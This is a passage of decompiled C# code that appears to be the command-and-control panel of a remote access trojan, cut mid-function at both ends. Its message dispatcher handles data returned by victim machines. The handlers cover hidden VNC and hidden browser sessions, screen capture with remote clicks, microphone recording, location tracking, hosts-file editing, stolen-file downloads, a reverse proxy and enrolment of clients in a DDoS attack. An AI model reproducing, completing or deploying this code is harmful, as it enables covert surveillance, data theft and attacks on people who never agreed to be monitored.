										startupManager2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
									}
								}
							}
						}
						else if (num <= 2948704552U)
						{
							if (num <= 2778429860U)
							{
								if (num != 2732161210U)
								{
									if (num == 2778429860U)
									{
										if (Operators.CompareString(text, "HAppsMSG", false) == 0)
										{
											bool invokeRequired54 = Messages.F.InvokeRequired;
											if (invokeRequired54)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												HApps happs5 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
												bool flag118 = happs5 != null;
												if (flag118)
												{
													happs5.ToolStripStatusLabel2.Text = array[2];
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "GetService", false) == 0)
								{
									bool invokeRequired55 = Messages.F.InvokeRequired;
									if (invokeRequired55)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										ServiceManager serviceManager2 = (ServiceManager)MyProject.Application.OpenForms["Service Manager : " + array[1]];
										bool flag119 = serviceManager2 != null;
										if (flag119)
										{
											serviceManager2.ListView1.Items.Clear();
											string[] array11 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
											int num25 = array11.Length - 1;
											for (int num26 = 0; num26 <= num25; num26++)
											{
												bool flag120 = array11[num26].Length > 0;
												if (flag120)
												{
													ListViewItem listViewItem9 = new ListViewItem();
													listViewItem9.Text = array11[num26];
													listViewItem9.ImageIndex = 0;
													listViewItem9.SubItems.Add(array11[num26 + 1]);
													listViewItem9.SubItems.Add(array11[num26 + 2]);
													listViewItem9.SubItems.Add(array11[num26 + 3]);
													listViewItem9.SubItems.Add(array11[num26 + 4]);
													serviceManager2.ListView1.Items.Add(listViewItem9);
												}
												num26 += 4;
											}
											serviceManager2.ToolStripStatusLabel2.Text = "Service [" + Conversions.ToString(serviceManager2.ListView1.Items.Count) + "]";
											serviceManager2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
										}
									}
								}
							}
							else if (num != 2797308720U)
							{
								if (num != 2885056862U)
								{
									if (num == 2948704552U)
									{
										if (Operators.CompareString(text, "GetInformations", false) == 0)
										{
											bool invokeRequired56 = Messages.F.InvokeRequired;
											if (invokeRequired56)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												INFO info2 = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
												bool flag121 = info2 != null;
												if (flag121)
												{
													info2.ListView1.Items.Clear();
													string[] array12 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
													foreach (string text14 in array12)
													{
														bool flag122 = !text14.Contains("Error!");
														if (flag122)
														{
															ListViewItem listViewItem10 = new ListViewItem();
															listViewItem10.Text = text14;
															listViewItem10.ImageKey = Strings.Split(text14, " :", -1, CompareMethod.Binary)[0].ToLower() + ".png";
															info2.ListView1.Items.Add(listViewItem10);
														}
													}
													info2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
													info2.ToolStripStatusLabel1.ForeColor = Color.Black;
													info2.ToolStripStatusLabel1.Text = "Informations [" + Conversions.ToString(info2.ListView1.Items.Count) + "]";
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "GetTCPConnection", false) == 0)
								{
									bool invokeRequired57 = Messages.F.InvokeRequired;
									if (invokeRequired57)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										TcpConnectionForm tcpConnectionForm = (TcpConnectionForm)MyProject.Application.OpenForms["TCP Connections : " + array[1]];
										bool flag123 = tcpConnectionForm != null;
										if (flag123)
										{
											tcpConnectionForm.ListView1.Items.Clear();
											string[] array14 = array[3].Split(new string[]
											{
												"-=>"
											}, StringSplitOptions.None);
											int num28 = array14.Length - 1;
											for (int num29 = 0; num29 <= num28; num29++)
											{
												bool flag124 = array14[num29].Length > 0;
												if (flag124)
												{
													ListViewItem listViewItem11 = new ListViewItem
													{
														Text = array14[num29]
													};
													bool flag125 = Operators.CompareString(array14[num29], array[2], false) == 0;
													if (flag125)
													{
														listViewItem11.ForeColor = Color.Red;
													}
													listViewItem11.SubItems.Add(array14[num29 + 1]);
													listViewItem11.SubItems.Add(array14[num29 + 2]);
													listViewItem11.SubItems.Add(array14[num29 + 3]);
													listViewItem11.ToolTipText = array14[num29];
													listViewItem11.ImageIndex = 0;
													tcpConnectionForm.ListView1.Items.Add(listViewItem11);
												}
												num29 += 3;
											}
											tcpConnectionForm.ToolStripStatusLabel2.Text = "Connections [" + Conversions.ToString(tcpConnectionForm.ListView1.Items.Count) + "]";
											tcpConnectionForm.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
										}
									}
								}
							}
							else if (Operators.CompareString(text, "ZipGet", false) == 0)
							{
								bool invokeRequired58 = Messages.F.InvokeRequired;
								if (invokeRequired58)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									FilesSearcher filesSearcher3 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
									bool flag126 = filesSearcher3 != null;
									if (flag126)
									{
										string text15 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "FilesSearcher");
										bool flag127 = array[2].Contains("\\") | array[2].Contains("/") | array[1].Contains("\\") | array[1].Contains("/");
										if (flag127)
										{
											filesSearcher3.ToolStripStatusLabel1.ForeColor = Color.Red;
											filesSearcher3.ToolStripStatusLabel1.Text = Path.GetFileName(array[2]) + " Download Blocked!";
										}
										else
										{
											filesSearcher3.Guna2GradientButton1.Enabled = true;
											bool flag128 = !Directory.Exists(text15);
											if (flag128)
											{
												Directory.CreateDirectory(text15);
											}
											File.WriteAllBytes(text15 + "\\" + array[2], Helper.Decompress(Convert.FromBase64String(array[3])));
											filesSearcher3.ToolStripStatusLabel1.ForeColor = Color.Green;
											filesSearcher3.ToolStripStatusLabel1.Text = "Successfully : " + array[2];
										}
									}
								}
							}
						}
						else if (num <= 3028356216U)
						{
							if (num != 3017121218U)
							{
								if (num != 3028177386U)
								{
									if (num == 3028356216U)
									{
										if (Operators.CompareString(text, "PING!", false) == 0)
										{
											bool invokeRequired59 = Messages.F.InvokeRequired;
											if (invokeRequired59)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												object online2 = SettingsHelper.Online;
												lock (online2)
												{
													try
													{
														byte[] state4 = Helper.SB("pong");
														Messages._Closure$__R5-7 CS$<>8__locals4 = new Messages._Closure$__R5-7(CS$<>8__locals4);
														CS$<>8__locals4.$VB$NonLocal_9 = C;
														ThreadPool.QueueUserWorkItem(delegate(object a0)
														{
															CS$<>8__locals4.$VB$NonLocal_9.BeginSend((byte[])a0);
														}, state4);
														bool flag130 = C.LV != null;
														if (flag130)
														{
															C.LV.SubItems[Messages.F._ActiveWindow.Index].Text = array[1].ToString();
															C.LV.SubItems[Messages.F._idle.Index].Text = Helper.uptimeToDHMS(Convert.ToInt32(array[2].ToString()));
														}
														else
														{
															Debug.WriteLine("Temp socket pinged server");
														}
													}
													catch (Exception ex12)
													{
														Debug.WriteLine("PING!: " + ex12.Message);
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "FormHVNC", false) == 0)
								{
									bool invokeRequired60 = Messages.F.InvokeRequired;
									if (invokeRequired60)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										HVNC hvnc = (HVNC)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
										bool flag131 = hvnc != null;
										if (flag131)
										{
											C.isDisconnected();
										}
										else
										{
											bool flag132 = hvnc == null;
											if (flag132)
											{
												new HVNC
												{
													C = C,
													Name = "Hidden VNC : " + array[1],
													Text = "Hidden VNC : " + array[1],
													Width = Convert.ToInt32(array[2]),
													Height = Convert.ToInt32(array[3])
												}.Show();
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "HBrowser+", false) == 0)
							{
								bool invokeRequired61 = Messages.F.InvokeRequired;
								if (invokeRequired61)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									HBrowser hbrowser2 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
									bool flag133 = hbrowser2 != null;
									if (flag133)
									{
										string text16 = array[2];
										bool flag134 = text16.Length > 0;
										if (flag134)
										{
											MemoryStream stream2 = new MemoryStream(Helper.Decompress(Convert.FromBase64String(text16)));
											Bitmap bitmap2 = (Bitmap)Image.FromStream(stream2);
											hbrowser2.PictureBox1.Image = bitmap2;
											hbrowser2.rdSize = bitmap2.Size;
											HBrowser hbrowser3 = hbrowser2;
											ref int ptr = ref hbrowser3.FPS;
											hbrowser3.FPS = ptr + 1;
											bool flag135 = hbrowser2.sw.ElapsedMilliseconds >= 1000L;
											if (flag135)
											{
												hbrowser2.Text = string.Concat(new string[]
												{
													"Hidden Browser : ",
													array[1],
													"  FPS:",
													hbrowser2.FPS.ToString(),
													"  Size:",
													Helper.BytesToString(unchecked((long)b.Length))
												});
												hbrowser2.FPS = 0;
												hbrowser2.sw = Stopwatch.StartNew();
											}
										}
										bool flag136 = Operators.CompareString(hbrowser2.Guna2GradientButton1.Text, "Capturing...", false) == 0;
										if (flag136)
										{
											byte[] state5 = Helper.SB("HBrowser+" + SettingsHelper.SPL + hbrowser2.Guna2ComboBox1.Text.Replace("%", "").ToString());
											Messages._Closure$__R5-6 CS$<>8__locals5 = new Messages._Closure$__R5-6(CS$<>8__locals5);
											CS$<>8__locals5.$VB$NonLocal_8 = C;
											ThreadPool.QueueUserWorkItem(delegate(object a0)
											{
												CS$<>8__locals5.$VB$NonLocal_8.BeginSend((byte[])a0);
											}, state5);
										}
									}
								}
							}
						}
						else if (num != 3062989349U)
						{
							if (num != 3304021358U)
							{
								if (num == 3388569596U)
								{
									if (Operators.CompareString(text, "MICGET", false) == 0)
									{
										bool invokeRequired62 = Messages.F.InvokeRequired;
										if (invokeRequired62)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											MIC mic2 = (MIC)MyProject.Application.OpenForms["MIC : " + array[3]];
											bool flag137 = mic2 != null;
											if (flag137)
											{
												mic2.ToolStripStatusLabel1.Text = "Size :  [" + Helper.BytesToString(unchecked((long)b.Length)) + "]";
												try
												{
													mic2.bwp.AddSamples(Helper.Decompress(Convert.FromBase64String(array[1])), 0, Convert.ToInt32(array[2]));
													GC.Collect();
												}
												catch (Exception ex13)
												{
												}
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "RevProxy", false) == 0)
							{
								bool invokeRequired63 = Messages.F.InvokeRequired;
								if (invokeRequired63)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Proxy proxy = (Proxy)MyProject.Application.OpenForms["ReverseProxy"];
									bool flag138 = proxy != null;
									if (flag138)
									{
										C.isDisconnected();
									}
									else
									{
										bool flag139 = proxy == null;
										if (flag139)
										{
											new Proxy
											{
												C = C,
												Name = "ReverseProxy",
												Text = "ReverseProxy",
												Cip = C.IP.ToString().Split(new char[]
												{
													':'
												})[0],
												PictureBox1 = 
												{
													Image = MyProject.Forms.Main.ii.Images[Messages.GetCountry.LookupCountryCode(C.IP.Split(new char[]
													{
														':'
													})[0]) + ".png"]
												},
												Label1 = 
												{
													Text = Messages.GetCountry.LookupCountryName(C.IP.Split(new char[]
													{
														':'
													})[0])
												}
											}.Show();
										}
									}
								}
							}
						}
						else if (Operators.CompareString(text, "viewimage", false) == 0)
						{
							FM fm5 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							try
							{
								MemoryStream memoryStream3 = new MemoryStream(Helper.Decompress(Convert.FromBase64String(array[2])));
								fm5.PictureBox1.Image = Image.FromStream(memoryStream3);
								memoryStream3.Dispose();
							}
							catch (Exception ex14)
							{
							}
						}
					}
					else if (num <= 3638721548U)
					{
						if (num <= 3481235046U)
						{
							if (num <= 3402712664U)
							{
								if (num != 3393716901U)
								{
									if (num == 3402712664U)
									{
										if (Operators.CompareString(text, "RD+", false) == 0)
										{
											bool invokeRequired64 = Messages.F.InvokeRequired;
											if (invokeRequired64)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												RemoteDesktop remoteDesktop = (RemoteDesktop)MyProject.Application.OpenForms["Monitor : " + array[4]];
												bool flag140 = remoteDesktop != null;
												if (flag140)
												{
													Image image4 = Image.FromStream(new MemoryStream(Helper.Decompress(Convert.FromBase64String(array[1]))));
													remoteDesktop.Sz = new Size(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
													remoteDesktop.PictureBox1.Image = image4;
													RemoteDesktop remoteDesktop2 = remoteDesktop;
													ref int ptr = ref remoteDesktop2.FPS;
													remoteDesktop2.FPS = ptr + 1;
													bool flag141 = remoteDesktop.sw.ElapsedMilliseconds >= 1000L;
													unchecked
													{
														if (flag141)
														{
															remoteDesktop.Text = string.Concat(new string[]
															{
																"Monitor : ",
																array[4],
																"  FPS:",
																remoteDesktop.FPS.ToString(),
																"  Size:",
																Helper.BytesToString((long)b.Length)
															});
															remoteDesktop.FPS = 0;
															remoteDesktop.sw = Stopwatch.StartNew();
														}
														bool flag142 = remoteDesktop.ToolStripStatusLabel4.ForeColor == Color.Green;
														if (flag142)
														{
															bool flag143 = (long)b.Length > 2048L;
															if (flag143)
															{
																try
																{
																	string str = Path.Combine(Application.StartupPath, "ClientsFolder", array[4], "Monitor");
																	image4.Save(str + "\\" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".jpg", ImageFormat.Jpeg);
																}
																catch (Exception ex15)
																{
																	remoteDesktop.ToolStripStatusLabel4.ForeColor = Color.Black;
																}
															}
														}
														bool flag144 = Operators.CompareString(remoteDesktop.Guna2GradientButton1.Text, "Capturing...", false) == 0;
														if (flag144)
														{
															bool flag145 = remoteDesktop.ToolStripStatusLabel5.ForeColor == Color.Green;
															if (flag145)
															{
																byte[] state6 = Helper.SB(string.Concat(new string[]
																{
																	"RDX",
																	SettingsHelper.SPL,
																	remoteDesktop.PictureBox1.Width.ToString(),
																	SettingsHelper.SPL,
																	remoteDesktop.PictureBox1.Height.ToString(),
																	SettingsHelper.SPL,
																	remoteDesktop.Guna2ComboBox1.Text.Replace("%", "").ToString()
																}));
																Messages._Closure$__R5-0 CS$<>8__locals6 = new Messages._Closure$__R5-0(CS$<>8__locals6);
																CS$<>8__locals6.$VB$NonLocal_2 = C;
																ThreadPool.QueueUserWorkItem(delegate(object a0)
																{
																	CS$<>8__locals6.$VB$NonLocal_2.BeginSend((byte[])a0);
																}, state6);
															}
															else
															{
																bool flag146 = remoteDesktop.ToolStripStatusLabel2.ForeColor == Color.Green;
																if (flag146)
																{
																	bool flag147 = remoteDesktop.op == default(Point);
																	if (!flag147)
																	{
																		Point point = new Point(0, 0);
																		point.X = remoteDesktop.op.X;
																		point.Y = remoteDesktop.op.Y;
																		remoteDesktop.op = default(Point);
																		byte[] state7 = Helper.SB(string.Concat(new string[]
																		{
																			"Click",
																			SettingsHelper.SPL,
																			Conversions.ToString(point.X),
																			SettingsHelper.SPL,
																			Conversions.ToString(point.Y),
																			SettingsHelper.SPL
																		}));
																		Messages._Closure$__R5-1 CS$<>8__locals7 = new Messages._Closure$__R5-1(CS$<>8__locals7);
																		CS$<>8__locals7.$VB$NonLocal_3 = C;
																		ThreadPool.QueueUserWorkItem(delegate(object a0)
																		{
																			CS$<>8__locals7.$VB$NonLocal_3.BeginSend((byte[])a0);
																		}, state7);
																	}
																}
																byte[] state8 = Helper.SB(string.Concat(new string[]
																{
																	"RD+",
																	SettingsHelper.SPL,
																	remoteDesktop.PictureBox1.Width.ToString(),
																	SettingsHelper.SPL,
																	remoteDesktop.PictureBox1.Height.ToString(),
																	SettingsHelper.SPL,
																	remoteDesktop.Guna2ComboBox1.Text.Replace("%", "").ToString(),
																	SettingsHelper.SPL,
																	remoteDesktop.Guna2ComboBox2.SelectedIndex.ToString()
																}));
																Messages._Closure$__R5-2 CS$<>8__locals8 = new Messages._Closure$__R5-2(CS$<>8__locals8);
																CS$<>8__locals8.$VB$NonLocal_4 = C;
																ThreadPool.QueueUserWorkItem(delegate(object a0)
																{
																	CS$<>8__locals8.$VB$NonLocal_4.BeginSend((byte[])a0);
																}, state8);
															}
														}
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "HvncMSG", false) == 0)
								{
									bool invokeRequired65 = Messages.F.InvokeRequired;
									if (invokeRequired65)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										HVNC hvnc2 = (HVNC)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
										bool flag148 = hvnc2 != null;
										if (flag148)
										{
											hvnc2.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (num != 3406373234U)
							{
								if (num != 3447577420U)
								{
									if (num == 3481235046U)
									{
										if (Operators.CompareString(text, "maps", false) == 0)
										{
											bool invokeRequired66 = Messages.F.InvokeRequired;
											if (invokeRequired66)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												Maps maps2 = (Maps)MyProject.Application.OpenForms["Location Manager : " + array[1]];
												bool flag149 = maps2 != null;
												if (flag149)
												{
													C.isDisconnected();
												}
												else
												{
													bool flag150 = maps2 == null;
													if (flag150)
													{
														new Maps
														{
															C = C,
															Name = "Location Manager : " + array[1],
															Text = "Location Manager : " + array[1]
														}.Show();
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "FilesSearcherMSG", false) == 0)
								{
									bool invokeRequired67 = Messages.F.InvokeRequired;
									if (invokeRequired67)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										FilesSearcher filesSearcher4 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
										bool flag151 = filesSearcher4 != null;
										if (flag151)
										{
											filesSearcher4.ToolStripStatusLabel1.ForeColor = Color.Green;
											filesSearcher4.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (Operators.CompareString(text, "PaSTIME", false) == 0)
							{
								bool invokeRequired68 = Messages.F.InvokeRequired;
								if (invokeRequired68)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Fun fun = (Fun)MyProject.Application.OpenForms["Pastime : " + array[1]];
									bool flag152 = fun != null;
									if (flag152)
									{
										C.isDisconnected();
									}
									else
									{
										bool flag153 = fun == null;
										if (flag153)
										{
											new Fun
											{
												C = C,
												Name = "Pastime : " + array[1],
												Text = "Pastime : " + array[1]
											}.Show();
										}
									}
								}
							}
						}
						else if (num <= 3501948104U)
						{
							if (num != 3483037620U)
							{
								if (num != 3499296070U)
								{
									if (num == 3501948104U)
									{
										if (Operators.CompareString(text, "TCPConnection", false) == 0)
										{
											bool invokeRequired69 = Messages.F.InvokeRequired;
											if (invokeRequired69)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												TcpConnectionForm tcpConnectionForm2 = (TcpConnectionForm)MyProject.Application.OpenForms["TCP Connections : " + array[1]];
												bool flag154 = tcpConnectionForm2 != null;
												if (flag154)
												{
													C.isDisconnected();
												}
												else
												{
													bool flag155 = tcpConnectionForm2 == null;
													if (flag155)
													{
														new TcpConnectionForm
														{
															C = C,
															Name = "TCP Connections : " + array[1],
															Text = "TCP Connections : " + array[1]
														}.Show();
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "MBoxMSG", false) == 0)
								{
									bool invokeRequired70 = Messages.F.InvokeRequired;
									if (invokeRequired70)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										MBox mbox3 = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
										bool flag156 = mbox3 != null;
										if (flag156)
										{
											mbox3.ToolStripStatusLabel1.ForeColor = Color.Green;
											mbox3.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (Operators.CompareString(text, "Hosts", false) == 0)
							{
								bool invokeRequired71 = Messages.F.InvokeRequired;
								if (invokeRequired71)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Hosts hosts2 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
									bool flag157 = hosts2 == null;
									if (flag157)
									{
										new Hosts
										{
											C = C,
											Name = "Edit Hosts : " + array[1],
											Text = "Edit Hosts : " + array[1]
										}.Show();
									}
									try
									{
										Hosts hosts3 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
										hosts3.Guna2TextBox1.Text = array[3];
										hosts3.Guna2TextBox2.Text = array[2];
									}
									catch (Exception ex16)
									{
									}
								}
							}
						}
						else if (num != 3503378378U)
						{
							if (num != 3542628156U)
							{
								if (num == 3638721548U)
								{
									if (Operators.CompareString(text, "HVNC", false) == 0)
									{
										bool invokeRequired72 = Messages.F.InvokeRequired;
										if (invokeRequired72)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											HVNC hvnc3 = (HVNC)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
											bool flag158 = hvnc3 != null;
											if (flag158)
											{
												Image image5 = Image.FromStream(new MemoryStream(Helper.Decompress(Convert.FromBase64String(array[2]))));
												hvnc3.PictureBox1.Image = image5;
												HVNC hvnc4 = hvnc3;
												ref int ptr = ref hvnc4.FPS;
												hvnc4.FPS = ptr + 1;
												bool flag159 = hvnc3.sw.ElapsedMilliseconds >= 1000L;
												if (flag159)
												{
													hvnc3.Text = string.Concat(new string[]
													{
														"Hidden VNC : ",
														array[1],
														"  FPS:",
														hvnc3.FPS.ToString(),
														"  Size:",
														Helper.BytesToString(unchecked((long)b.Length))
													});
													hvnc3.FPS = 0;
													hvnc3.sw = Stopwatch.StartNew();
												}
												bool flag160 = Operators.CompareString(hvnc3.Guna2GradientButton1.Text, "Capturing...", false) == 0;
												if (flag160)
												{
													byte[] state9 = Helper.SB(string.Concat(new string[]
													{
														"Cap",
														SettingsHelper.SPL,
														hvnc3.Guna2ComboBox1.Text.Replace("%", "").ToString(),
														SettingsHelper.SPL,
														Conversions.ToString(Convert.ToDouble(hvnc3.Guna2ComboBox3.Text.Replace("%", "").ToString()) / 100.0)
													}));
													Messages._Closure$__R5-4 CS$<>8__locals9 = new Messages._Closure$__R5-4(CS$<>8__locals9);
													CS$<>8__locals9.$VB$NonLocal_6 = C;
													ThreadPool.QueueUserWorkItem(delegate(object a0)
													{
														CS$<>8__locals9.$VB$NonLocal_6.BeginSend((byte[])a0);
													}, state9);
												}
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "WindowsActive", false) == 0)
							{
								bool invokeRequired73 = Messages.F.InvokeRequired;
								if (invokeRequired73)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									HBrowser hbrowser4 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
									bool flag161 = hbrowser4 != null;
									if (flag161)
									{
										hbrowser4.ListView1.Items.Clear();
										hbrowser4.ImageList1.Images.Clear();
										string[] array15 = array[2].Split(new string[]
										{
											"-==>"
										}, StringSplitOptions.None);
										int num30 = array15.Length - 1;
										for (int num31 = 0; num31 <= num30; num31++)
										{
											bool flag162 = array15[num31].Length > 0;
											if (flag162)
											{
												ListViewItem listViewItem12 = new ListViewItem();
												listViewItem12.Text = new FileInfo(array15[num31]).Name;
												listViewItem12.SubItems.Add(array15[num31 + 3]);
												Image image6 = Image.FromStream(new MemoryStream(Convert.FromBase64String(array15[num31 + 2])));
												hbrowser4.ImageList1.Images.Add(array15[num31 + 1], image6);
												listViewItem12.ImageKey = array15[num31 + 1];
												listViewItem12.ToolTipText = array15[num31];
												hbrowser4.ListView1.Items.Add(listViewItem12);
											}
											num31 += 3;
										}
										hbrowser4.ToolStripStatusLabel1.Text = "Browsers [" + hbrowser4.ListView1.Items.Count.ToString() + "]";
										hbrowser4.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
									}
								}
							}
						}
						else if (Operators.CompareString(text, "RD-", false) == 0)
						{
							bool invokeRequired74 = Messages.F.InvokeRequired;
							unchecked
							{
								if (invokeRequired74)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									RemoteDesktop remoteDesktop3 = (RemoteDesktop)MyProject.Application.OpenForms["Monitor : " + array[4]];
									bool flag163 = remoteDesktop3 != null;
									if (flag163)
									{
										C.isDisconnected();
									}
									else
									{
										bool flag164 = remoteDesktop3 == null;
										if (flag164)
										{
											remoteDesktop3 = new RemoteDesktop();
											remoteDesktop3.C = C;
											remoteDesktop3.CID = array[4];
											remoteDesktop3.Name = "Monitor : " + array[4];
											remoteDesktop3.Text = "Monitor : " + array[4];
											remoteDesktop3.Sz = new Size(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
											double num32 = 0.0;
											double num33 = Conversions.ToDouble(array[1]) - 1.0;
											for (;;)
											{
												double num34 = num32;
												double num35 = num33;
												bool flag165 = num34 > num35;
												if (flag165)
												{
													break;
												}
												remoteDesktop3.Guna2ComboBox2.Items.Add("Device : " + Conversions.ToString(num32));
												num32 += 1.0;
											}
											remoteDesktop3.Guna2ComboBox1.SelectedIndex = 2;
											remoteDesktop3.Guna2ComboBox2.SelectedIndex = 0;
											remoteDesktop3.Show();
										}
									}
								}
							}
						}
					}
					else if (num <= 3778728359U)
					{
						if (num <= 3668519976U)
						{
							if (num != 3655629987U)
							{
								if (num == 3668519976U)
								{
									if (Operators.CompareString(text, "ClibHVNC", false) == 0)
									{
										bool invokeRequired75 = Messages.F.InvokeRequired;
										if (invokeRequired75)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Clipboard.SetText(array[1]);
										}
									}
								}
							}
							else if (Operators.CompareString(text, "HostsErr", false) == 0)
							{
								bool invokeRequired76 = Messages.F.InvokeRequired;
								if (invokeRequired76)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Hosts hosts4 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
									bool flag166 = hosts4 != null;
									if (flag166)
									{
										hosts4.ToolStripStatusLabel1.ForeColor = Color.Red;
										hosts4.ToolStripStatusLabel1.Text = array[2];
										hosts4.ToolStripMenuItem1.Enabled = true;
									}
								}
							}
						}
						else if (num != 3734767304U)
						{
							if (num != 3739401914U)
							{
								if (num == 3778728359U)
								{
									if (Operators.CompareString(text, "DDos", false) == 0)
									{
										bool invokeRequired77 = Messages.F.InvokeRequired;
										if (invokeRequired77)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											DDosAttack ddosAttack = (DDosAttack)MyProject.Application.OpenForms["DDosAttack"];
											bool flag167 = ddosAttack != null;
											if (flag167)
											{
												bool flag168 = !DDosAttack.Clients.Contains(C);
												if (flag168)
												{
													DDosAttack.Clients.Add(C);
													ddosAttack.ToolStripStatusLabel2.Text = "Clients [" + Conversions.ToString(DDosAttack.Clients.Count) + "]";
												}
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "HBrowserMSG", false) == 0)
							{
								bool invokeRequired78 = Messages.F.InvokeRequired;
								if (invokeRequired78)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									HBrowser hbrowser5 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
									bool flag169 = hbrowser5 != null;
									if (flag169)
									{
										hbrowser5.ToolStripStatusLabel2.Text = array[2];
									}
								}
							}
						}
						else if (Operators.CompareString(text, "Programs", false) == 0)
						{
							bool invokeRequired79 = Messages.F.InvokeRequired;
							if (invokeRequired79)
							{
								Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
								{
									C,
									b
								});
							}
							else
							{
								Programs programs2 = (Programs)MyProject.Application.OpenForms["Installed Programs : " + array[1]];
								bool flag170 = programs2 != null;
								if (flag170)
								{
									C.isDisconnected();
								}
								else
								{
									bool flag171 = programs2 == null;
									if (flag171)
									{
										new Programs
										{
											C = C,
											Name = "Installed Programs : " + array[1],
											Text = "Installed Programs : " + array[1]
										}.Show();
									}
								}
							}
						}
					}
					else if (num <= 3879771275U)
					{
						if (num != 3792856981U)
						{
							if (num != 3795547464U)
							{
								if (num == 3879771275U)
								{
									if (Operators.CompareString(text, "GetPerformance", false) == 0)
									{
										bool invokeRequired80 = Messages.F.InvokeRequired;
										if (invokeRequired80)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Performance performance2 = (Performance)MyProject.Application.OpenForms["Performance : " + array[1]];
											bool flag172 = performance2 != null;
											if (flag172)
											{
												performance2.Guna2CircleProgressBar1.Value = Conversions.ToInteger(array[2]);
												performance2.Guna2CircleProgressBar2.Value = Conversions.ToInteger(array[3]);
												performance2.Label13.Text = array[4] + " Minutes";
											}
										}
									}
								}
							}
